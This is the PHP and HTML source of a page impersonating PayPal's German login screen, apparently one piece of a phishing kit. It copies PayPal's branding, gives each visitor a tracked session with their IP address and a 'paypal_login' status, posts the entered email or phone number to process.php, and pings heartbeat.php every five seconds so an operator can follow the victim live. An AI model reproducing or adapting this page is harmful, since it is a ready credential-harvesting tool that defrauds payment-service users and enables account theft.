<?php
require 'config.php';

if (!isset($_GET['sid'])) {
    $new_sid = bin2hex(random_bytes(16));
    $_SESSION['sid'] = $new_sid;
    $initial_data = [
        'sid' => $new_sid, 'ip' => get_client_ip(), 'status' => 'paypal_login',
        'redirect_url' => 'index.php', 'last_activity' => time()
    ];
    save_session($new_sid, $initial_data);
    redirect('index.php?sid=' . $new_sid);
    exit;
}

$sid = $_GET['sid'];
$session = get_session($sid);
?>
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal</title>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
    body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #001435; }
    
    .login-container { width: 100%; max-width: 480px; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; margin-top: auto; margin-bottom: auto; }
    
    .logo-img { height: 36px; margin-bottom: 50px; }
    
    .form-group { width: 100%; margin-bottom: 20px; position: relative; }
    .form-control { width: 100%; padding: 16px 14px; border: 1px solid #9da3a6; border-radius: 4px; font-size: 16px; color: #001435; outline: none; transition: border-color 0.2s; }
    .form-control:focus { border-color: #0070ba; box-shadow: 0 0 0 1px #0070ba; }
    .form-control::placeholder { color: #687173; }
    
    .forgot-link { display: inline-block; color: #005ea6; font-size: 15px; text-decoration: none; font-weight: 600; margin-top: -10px; margin-bottom: 25px; }
    .forgot-link:hover { text-decoration: underline; }
    
    .btn-primary { width: 100%; padding: 16px; background: #0070ba; color: #ffffff; border: none; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; transition: background 0.2s; text-decoration: none; display: block; }
    .btn-primary:hover { background: #005ea6; }
    
    .divider { display: flex; align-items: center; width: 100%; margin: 25px 0; color: #687173; font-size: 14px; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dddddd; }
    .divider::before { margin-right: 15px; }
    .divider::after { margin-left: 15px; }
    
    .btn-secondary { width: 100%; padding: 16px; background: #ffffff; color: #001435; border: 1px solid #001435; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; transition: background 0.2s; text-decoration: none; display: block; }
    .btn-secondary:hover { background: #f5f7fa; }
    
    .lang-selector { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 60px; font-size: 14px; color: #001435; cursor: pointer; font-weight: 600; }
    .lang-selector img { width: 20px; height: auto; border-radius: 2px; }
    .lang-selector .current { color: #001435; }
    .lang-selector .other { color: #687173; font-weight: 400; }
    
    .footer { width: 100%; padding: 20px; text-align: center; background: #ffffff; font-size: 13px; color: #001435; border-top: 1px solid #f0f0f0; margin-top: auto; }
    .footer a { color: #001435; text-decoration: none; margin: 0 10px; }
    .footer a:hover { text-decoration: underline; }
</style>
</head>
<body>

    <div class="login-container">
        <img src="paypal_logo.svg" alt="PayPal" class="logo-img" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg'; this.style.height='36px';">
        
        <form method="POST" action="process.php?sid=<?php echo htmlspecialchars($sid); ?>" style="width: 100%;">
            <div class="form-group">
                <input type="text" name="identifier" class="form-control" placeholder="E-Mail-Adresse oder Handynummer" required autocomplete="username" autofocus>
            </div>
            
            <a href="#" class="forgot-link">E-Mail-Adresse vergessen?</a>
            
            <button type="submit" class="btn-primary">Weiter</button>
        </form>
        
        <div class="divider">oder</div>
        
        <a href="#" class="btn-secondary">Neu anmelden</a>
        
        <div class="lang-selector">
            <img src="https://flagcdn.com/w20/de.png" alt="DE">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><polyline points="6 9 12 15 18 9"></polyline></svg>
            <span class="current">Deutsch</span>
            <span style="color:#dddddd;">|</span>
            <span class="other">English</span>
        </div>
    </div>

    <div class="footer">
        <a href="#">Kontakt</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
        <a href="#">Weltweit</a>
    </div>

    <script>
        setInterval(function() {
            const sid = new URLSearchParams(window.location.search).get('sid');
            if (sid) { fetch('heartbeat.php?sid=' + sid).catch(() => {}); }
        }, 5000);
    </script>
</body>
</html>